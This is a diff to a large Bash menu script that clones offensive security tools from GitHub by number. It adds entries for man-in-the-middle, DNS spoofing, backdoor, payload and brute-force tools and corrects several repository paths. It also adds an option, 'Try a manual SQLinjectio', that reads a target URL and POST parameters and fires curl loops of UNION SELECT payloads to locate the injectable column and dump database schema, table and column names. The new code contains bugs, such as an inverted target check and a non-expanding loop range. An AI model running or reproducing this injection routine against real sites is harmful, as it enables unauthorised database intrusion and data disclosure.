@@ -345,7 +345,8 @@ while true; do
 	Stampa " 1198. adtac/fssb" "1202. JackOfMostTrades/gadgetinspector" "1203. med0x2e/GadgetToJScript"
 	Stampa " 2512. geohot/qira" "2513. JonathanSalwan/ROPgadget" "1287. trolldbois/python-haystack"
 	Stampa " 2611. ochronasec/ochrona-cli" "1332. airbus-seclab/ilo4_toolbox" "1373. SideChannelMarvels/JeanGrey"
-	Stampa " 1472. GoSecure/malboxes" "1493. platomav/MEAnalyzer"
+	Stampa " 1472. GoSecure/malboxes" "1493. platomav/MEAnalyzer" "1522. CoolerVoid/Mosca"
+	Stampa " 1535. mitre/multiscanner" "1537. Neo23x0/munin"
 	echo "$SEP"
 	echo "ANDROID - APK"
 	Stampa " 128. xtiankisutsa/MARA_Framework" "274. yasoob/nrc-exporter" "277. mzfr/slicer"
@@ -404,7 +405,7 @@ while true; do
 	Stampa " 861. giuliocomi/backoori" "1027. gitdurandal/dbd" "1083. Shellntel/backdoors"
 	Stampa " 1056. Mr-Un1k0d3r/DKMC" "1073. TheWover/donut" "1084. emptymonkey/drinkme"
 	Stampa " 2313. cribdragg3r/Alaris" "1206. byt3bl33d3r/gcat" "1229. razc411/GoBD"
-	Stampa " 2551. ORCA666/EarlyBird" "2622. phath0m/JadedWraith"
+	Stampa " 2551. ORCA666/EarlyBird" "2622. phath0m/JadedWraith" "1504. Screetsec/Microsploit"
 	echo "$SEP"
 	echo "BLUETOOTH"
 	Stampa " 305. lucaboni92/BlueFuzz" "440. fO-000/bluescan" "447. MillerTechnologyPeru/hcitool"
@@ -484,6 +485,7 @@ while true; do
 	Stampa " 2494. hashtopolis/server" "1273. UltimateHackers/Hash-Buster" "2508. hellman/xortool"
 	Stampa " 2505. KishanBagaria/padding-oracle-attacker" "2506. Ganapati/RsaCtfTool" "2507. ius/rsatool"
 	Stampa " 1276. hashcat/hashcat-utils" "1286. trustedsec/hate_crack" "2595. navin-maverick/BruteBot"
+	Stampa " 1541. MooseDojo/myBFF"
 	echo "$SEP"
 	echo "CRAWLING - SPIDERING - SCRAPING"
 	Stampa " 586. saeeddhqan/evine" "722. OWASP/OWASP-WebScarab" "733. gotr00t0day/spider00t"
@@ -507,7 +509,7 @@ while true; do
 	Stampa " 1090. dlang-community/D-Scanner"
 	echo "$SEP"
 	echo "DATABASES"
-	Stampa " 1421. woj-ciech/LeakLooker" "1490. evanmiller/mdbtools"
+	Stampa " 1421. woj-ciech/LeakLooker" "1490. evanmiller/mdbtools" "1531. BlackArch/msfdb"
 	echo "$SEP"
 	echo "DEBUGGING - DECOMPILING"
 	Stampa " 144. snare/voltron" "125. detailyang/readelf" "222. vivisect/vivisect"
@@ -545,7 +547,7 @@ while true; do
 	Stampa " 492. darkoperator/dnsrecon" "493. neiltyagi/DNSRECON" "496. rs/dnstrace"
 	Stampa " 497. redsift/dnstrace" "498. dkorunic/dnstrace" "528. mfocuz/DNS_Hunter"
 	Stampa " 752. theMiddleBlue/DNSenum" "753. rbsec/dnscan" "1057. lorenzog/dns-parallel-prober"
-	Stampa " 783. gr3yc4t/dns-poisoning-tool" "784. SemyonMakhaev/dns-poison"
+	Stampa " 783. gr3yc4t/dns-poisoning-tool" "784. SemyonMakhaev/dns-poison" "1506. daehee/mildew"
 	Stampa " 785. ShanjinurIslam/Computer-Security-DNS-Cache-Poisoning"
 	Stampa " 799. blark/aiodnsbrute" "803. infosec-au/altdns" "831. tomnomnom/assetfinder"
 	Stampa " 945. projectdiscovery/chaos-client" "1063. erbbysam/DNSGrep" "2293. ProjectAnte/dnsgen"
@@ -555,6 +557,7 @@ while true; do
 	Stampa " 1165. stealth/fernmelder" "1173. Edu4rdSHL/findomain" "1190. kirei/fpdns"
 	Stampa " 1235. zombiesam/googlesub" "1269. hakluke/hakrevdns" "1374. utkusen/jeopardize"
 	Stampa " 1407. guelfoweb/knock" "1487. blechschmidt/massdns" "1492. chadillac/mdns_recon"
+	Stampa " 1525. waytoalpit/ManOnTheSideAttack-DNS-Spoofing"
 	echo "$SEP"
 	echo "DOCKER"
 	Stampa " 351. cr0hn/dockerscan" "352. RhinoSecurityLabs/ccat" "2420. kost/dockscan"
@@ -583,6 +586,7 @@ while true; do
 	Stampa " 1096. anantshri/DS_Store_crawler_parser" "1121. dejanlevaja/enum_shares"
 	Stampa " 2546. santiko/KnockPy" "1361. lavalamp-/ipv666" "1365. salesforce/ja3"
 	Stampa " 1392. hotelzululima/kacak" "1423. carlospolop/legion" "2629. SecuProject/ADenum"
+	Stampa " 1532. wez3/msfenum"
 	echo "$SEP"
 	echo "EVASION - BYPASSING - OBFUSCATION"
 	Stampa " 167. govolution/avet" "134. khalilbijjou/WAFNinja" "174. stormshadow07/HackTheWorld"
@@ -636,6 +640,10 @@ while true; do
 	Stampa " 414. hhhrrrttt222111/Dorkify" "415. Chr0m0s0m3s/DeadTrap" "420. techgaun/github-dorks"
 	Stampa " 531. CERT-Polska/hfinger" "581. EnableSecurity/wafw00f" "779. ethicalhackingplayground/dorkX"
 	Stampa " 781. E4rr0r4/XGDork" "854. aliasrobotics/aztarna" "884. Hood3dRob1n/BinGoo"
+	Stampa " 1539. falcon-lnhg/mwebfp"
+	echo "$SEP"
+	echo "FREQUENCY"
+	Stampa " 1534. EliasOenal/multimon-ng"
 	echo "$SEP"
 	echo "FTP"
 	Stampa " 147. WalderlanSena/ftpbrute" "149. AlphaRoy14/km985ytv-ftp-exploit"
@@ -726,7 +734,7 @@ while true; do
 	Stampa " 1251. greenbone/gsa" "1257. greenbone/gvmd"
 	echo "$SEP"
 	echo "HARDWARE"
-	Stampa " 2458. samyk/glitchsink"
+	Stampa " 2458. samyk/glitchsink" "1526. iamckn/mousejack_transmit"
 	echo "$SEP"
 	echo "HASH"
 	Stampa " 2260. cube0x0/HashSpray.py" "2446. MichaelDim02/houndsniff" "1274. iagox86/hash_extender"
@@ -757,10 +765,11 @@ while true; do
 	Stampa " 1020. BlackArch/darkmysqli" "1032. UndeadSec/Debinject" "2298. the-robot/sqliv"
 	Stampa " 2536. dlegs/php-jpeg-injector" "1310. PaulSec/HQLmap" "1334. jklmnn/imagejs"
 	Stampa " 1383. ron190/jsql-injection" "1419. sduverger/ld-shatner" "1450. gaffe23/linux-inject"
-	Stampa " 1480. z0noxz/mando.me"
+	Stampa " 1480. z0noxz/mando.me" "1524. kevinkoo001/MotS"
 	echo "$SEP"
 	echo "HTTP - HTTP/2"
 	Stampa " 1260. summerwind/h2spec" "1313. lijiejie/htpwdScan" "1418. wireghoul/lbmap"
+	Stampa " 1519. RedTeamPentesting/monsoon"
 	echo "$SEP"
 	echo "IIS"
 	Stampa " 22. 0x09AL/IIS-Raid" "23. thelinuxchoice/evilreg" "24. thelinuxchoice/eviloffice"
@@ -819,6 +828,7 @@ while true; do
 	echo "$SEP"
 	echo "JWT"
 	Stampa " 1389. brendan-rius/c-jwt-cracker" "1390. ticarpi/jwt_tool" "1391. aress31/jwtcat"
+	Stampa " 1542. mBouamama/MyJWT"
 	echo "$SEP"
 	echo "KERBEROS"
 	Stampa " 3. ropnop/kerbrute" "26. TarlogicSecurity/kerbrute" "5. CroweCybersecurity/ad-ldap-enum"
@@ -922,12 +932,22 @@ while true; do
 	Stampa " 1292. ApertureLabsLtd/hdmi-sniff" "1305. xme/hoover" "1308. schollz/howmanypeoplearearound"
 	Stampa " 1322. nbuechler/hungry-interceptor" "1325. xiam/hyperfox" "1364. juphoff/issniff"
 	Stampa " 1386. rixed/junkie" "1416. DanMcInerney/LANs.py" "1479. sensepost/mana"
+	Stampa " 1510. blackeko/mitm" "1511. jrmdev/mitm_relay" "1512. dirkjanm/mitm6"
+	Stampa " 1513. xdavidhu/mitmAP" "1514. husam212/MITMer" "1515. byt3bl33d3r/MITMf"
+	Stampa " 1517. arkime/arkime"
 	echo "$SEP"
 	echo "MOBILE"
 	Stampa " 2344. sensepost/objection" "2593. tegal1337/CiLocks"
 	echo "$SEP"
+	echo "MODEM"
+	Stampa " 1509. kamalmostafa/minimodem"
+	echo "$SEP"
 	echo "MONGODB - NOSQL"
 	Stampa " 230. youngyangyang04/NoSQLAttack" "231. codingo/NoSQLMap" "232. torque59/Nosql-Exploitation-Framework"
+	Stampa " 1518. stampery/mongoaudit"
+	echo "$SEP"
+	echo "MRT"
+	Stampa " 1529. t2mune/mrtparse"
 	echo "$SEP"
 	echo "MYSQL"
 	Stampa " 301. ufuksungu/MySqlBruteForce/mysql"
@@ -938,8 +958,8 @@ while true; do
 	echo "NETLOGON"
 	Stampa " 508. risksense/zerologon" "509. bb00/zer0dump" "510. VoidSec/CVE-2020-1472"
 	echo "$SEP"
-	echo "NETWORK"
-	Stampa " 2504. tomac/yersinia"
+	echo "NETWORK - TCP - UDP"
+	Stampa " 2504. tomac/yersinia" "1527. CiscoCXSecurity/mptcp-abuse" "1543. mehrdadrad/mylg"
 	echo "$SEP"
 	echo "NGINX"
 	Stampa " 2461. stark0de/nginxpwner"
@@ -955,7 +975,7 @@ while true; do
 	echo "$SEP"
 	echo "PAYLOAD"
 	Stampa " 1270. Rich5/Harness" "1295. EgeBalci/HERCULES" "1343. 4w4k3/Insanity-Framework"
-	Stampa " 2618. Deadpool2000/Paybag" "1412. sensepost/kwetza"
+	Stampa " 2618. Deadpool2000/Paybag" "1412. sensepost/kwetza" "1530. g0tmi1k/mpc"
 	echo "$SEP"
 	echo "PDF"
 	Stampa " 46. thelinuxchoice/evilpdf" "47. robins/pdfcrack" "48. BroadbentT/PDF-CRACKER/pdf-cracker"
@@ -988,11 +1008,11 @@ while true; do
 	echo "PRIVESC"
 	Stampa " 2394. swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Linux-PrivilegeEscalation"
 	echo "$SEP"
-	echo "PROXY"
+	echo "PROXY - REVERSE PROXY"
 	Stampa " 162. fozavci/viproy-VoIPkit" "610. audibleblink/doxycannon" "885. nccgroup/BinProxy"
 	Stampa " 1058. StalkR/dns-reverse-proxy" "1059. maurotfilho/dns-spoof" "1060. d4rkcat/dnsbrute"
 	Stampa " 1061. dmitescu/dnscobra" "1062. leonjza/dnsfilexfer" "2403. p3nt4/Invoke-SocksProxy/ReverseSocksProxyHandler"
-	Stampa " 1475. justmao945/mallory"
+	Stampa " 1475. justmao945/mallory" "1538. muraenateam/muraena"
 	echo "$SEP"
 	echo "PRY"
 	Stampa " 743. deivid-rodriguez/pry-byebug"
@@ -1077,7 +1097,8 @@ while true; do
 	Stampa " 853. chokepoint/azazel"
 	echo "$SEP"
 	echo "ROUTERS"
-	Stampa " 145. threat9/routersploit" "2487. acecilia/OpenWRTInvasion"
+	Stampa " 145. threat9/routersploit" "2487. acecilia/OpenWRTInvasion" "1505. kost/mikrotik-npk"
+	Stampa " 1533. kkonradpl/mtscan"
 	echo "$SEP"
 	echo "RPC"
 	Stampa " 233. aress31/xmlrpc-bruteforcer" "313. s4vitar/rpcenum" "570. hegusung/RPCScan"
@@ -1130,7 +1151,7 @@ while true; do
 	Stampa " 2279. MrCl0wnLab/ShellShockHunter" "2280. DanMcInerney/shellshock-hunter"
 	echo "$SEP"
 	echo "SIP"
-	Stampa " 1363. halitalptekin/isip"
+	Stampa " 1363. halitalptekin/isip" "1528. meliht/mr.sip"
 	echo "$SEP"
 	echo "SMB"
 	Stampa " 68. m4ll0k/SMBrute" "58. mvelazc0/Invoke-SMBLogin/smblogin" "65. ShawnDEvans/smbmap"
@@ -1269,6 +1290,7 @@ while true; do
 	Stampa " 2582. use nmap to scan ports with external" "2583. use nmap to scan ports with fuzzer" "2584. use nmap to scan ports with intrusive"
 	Stampa " 2585. use nmap to scan ports with malware" "2586. use nmap to scan ports with safe" "2587. use nmap to scan ports with version"
 	Stampa " 2591. read symbols and other infos from binary" "2625. create a zipbomb manually" "2626. use metasploit"
+	Stampa " 2633. Try a manual SQLinjectio"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -1350,7 +1372,7 @@ while true; do
 	Stampa " 184. lwzSoviet/NoXss" "394. Jewel591/xssmap" "558. dwisiswant0/findom-xss"
 	Stampa " 620. hahwul/XSpear" "623. r0oth3x49/Xpath" "780. capture0x/XSS-LOADER"
 	Stampa " 814. lewangbtcc/anti-XSS" "1069. whitel1st/docem" "1183. riusksk/FlashScanner"
-	Stampa " 2475. yehia-mamdouh/XSSYA-V-2.0" "1316. Danladi/HttpPwnly"
+	Stampa " 2475. yehia-mamdouh/XSSYA-V-2.0" "1316. Danladi/HttpPwnly" "1523. koto/mosquito"
 	echo "$SEP"
 	echo "ZIGBEE"
 	Stampa " 1403. riverloopsec/killerbee"
@@ -1378,7 +1400,10 @@ while true; do
 	Stampa " 1297. sharkdp/hexyl" "1324. vanhauser-thc/thc-hydra" "1378. incogbyte/jsearch"
 	Stampa " 1382. nahamsec/JSParser" "1387. telerik/JustDecompileEngine" "1406. klee/klee"
 	Stampa " 1415. rflynn/lanmap2" "1422. mmicu/leena" "2630. 9emin1/charlotte"
-	Stampa " 1481. trailofbits/manticore"
+	Stampa " 1481. trailofbits/manticore" "1516. fox-it/mkYARA"
+	echo "$SEP"
+	echo "PLUGIN"
+	Stampa " 1499. hahwul/metasploit-autopwn/db_autopwn"
 	echo "$SEP"
 	echo "GLOBAL VARIABLES"
 	Stampa " 2559. Target Username" "2560. Target Password" "2561. Target Domain"
@@ -7188,13 +7213,13 @@ while true; do
 		Clona "kamalmostafa/minimodem"
 	;;
 	"1510")
-		Clona "Th3Hurrican3/mitm"
+		Clona "blackeko/mitm"
 	;;
 	"1511")
 		Clona "jrmdev/mitm_relay"
 	;;
 	"1512")
-		Clona "fox-it/mitm6"
+		Clona "dirkjanm/mitm6"
 	;;
 	"1513")
 		Clona "xdavidhu/mitmAP"
@@ -7209,7 +7234,7 @@ while true; do
 		Clona "fox-it/mkYARA"
 	;;
 	"1517")
-		Clona "aol/moloch"
+		Clona "arkime/arkime"
 	;;
 	"1518")
 		Clona "stampery/mongoaudit"
@@ -7239,13 +7264,13 @@ while true; do
 		Clona "iamckn/mousejack_transmit"
 	;;
 	"1527")
-		Clona "Neohapsis/mptcp-abuse"
+		Clona "CiscoCXSecurity/mptcp-abuse"
 	;;
 	"1528")
 		Clona "meliht/mr.sip"
 	;;
 	"1529")
-		Clona "YoshiyukiYamauchi/mrtparse"
+		Clona "t2mune/mrtparse"
 	;;
 	"1530")
 		Clona "g0tmi1k/mpc"
@@ -11249,6 +11274,62 @@ while true; do
 	;;
 	"2632")
 		Clona "PalindromeLabs/STEWS"
+	;;
+	"2633")
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit the Target url"
+			read -p "(example, http://www.terget.com): " TIP
+		fi
+		echo "Digit the POST parameters with the special char"
+		read -p "(example with a single quote, email=hello@gmail.com'): " PAR
+		if [[ "$PAR" != "" ]];
+		then
+			curl -s -k -X POST -d "$PAR"" UNION SELECT version() -- -" "$TIP"
+			for I in {1..9}
+			do
+				if [[ "$Q" == "" ]];
+				then
+					Q="$I"","
+				else
+					Q="$Q""$I"","
+				fi
+			curl -s -k -X POST -d "$PAR"" UNION SELECT ""$Q""version() -- -" "$TIP"
+			done
+			echo "Digit the position of version, if was the first occurence, digit 1, otherwise digit the position number ignoring other numbers"
+			echo "'1,2,8.0.15', the position will be 3 (ignoring the other numbers)"
+			read -p "(example, 1): " POS
+			if [[ "$POS" != "" ]];
+			then
+				PES=""
+				if [[ $POS > 1 ]];
+				then
+					POS=$(($POS - 1))
+					for O in {1..$POS}
+					do
+						PES="$PES"",""$O"
+					done
+					PES="$PES"","
+					for A in {0..100}
+					do
+						for B in {0..100}
+						do
+							curl -s -k -X POST -d "$PAR"" UNION SELECT ""$PES""CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+						done
+					done
+				else
+					for A in {0..100}
+					do
+						for B in {0..100}
+						do
+							curl -s -k -X POST -d "$PAR"" UNION SELECT CONCAT(TABLE_SCHEMA, \":\", TABLE_NAME, \":\", COLUMN_NAME, \"\") FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA != 'Information_Schema' LIMIT ""$A"" OFFSET ""$B"" -- -" "$TIP"
+						done
+					done
+				fi
+				PES=""
+				POS=""
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
